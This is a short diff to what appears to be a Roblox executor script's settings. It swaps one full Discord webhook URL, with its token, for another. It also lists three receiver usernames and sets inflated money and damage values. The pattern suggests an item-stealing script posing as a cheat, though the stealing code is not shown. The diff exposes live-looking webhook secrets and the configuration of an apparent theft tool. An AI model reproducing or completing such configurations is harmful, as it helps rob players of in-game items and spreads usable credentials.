@@ -1,6 +1,6 @@
 
 
-getgenv().WEBHOOK = "https://discord.com/api/webhooks/1430521169123086442/e3Rd7PQT7Mfjrs6t9te4Q2aeETXAQVKAvPwySMp1pE-YnCQKhASwlqfOSVHhNuAnbJVS"
+getgenv().WEBHOOK = "https://discord.com/api/webhooks/1431158027226054687/-v47t1Pu8Sm6bB6YKP_O7lY-aoBwUVkO3x05rOSZV-ruD1Wamm7LzJ5s5ZPusLphTToa"
 getgenv().RECEIVERS = {"Jenicacute1239", "renejaylowbuget", "Wsuskans"}
 getgenv().MONEY_PER_SECOND = 500000 -- DEFAULT: 100000/s
 getgenv().DMG_PER_SECOND = 100000 -- DEFAULT: 100000/s
